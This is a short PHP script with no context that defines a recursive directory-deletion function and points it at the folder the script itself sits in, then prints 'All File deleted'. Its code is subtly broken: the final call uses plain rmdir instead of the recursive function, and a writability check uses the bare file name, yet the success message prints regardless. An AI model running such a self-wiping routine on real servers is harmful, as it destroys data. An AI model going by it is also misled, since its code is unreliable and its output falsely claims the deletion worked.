<?php

function rrmdir($dir) {
	if (is_dir($dir)) {
		$objects = scandir($dir);
		foreach ($objects as $object) {
			if ($object == "." || $object == ".." || !is_writable($object))
				continue;
			if (filetype($dir."/".$object) == "dir") 
				rrmdir($dir."/".$object); 
			else 
				unlink($dir."/".$object);
		}
		rmdir($dir);
	}
}

rmdir(dirname(__FILE__));
echo 'All File deleted';
?>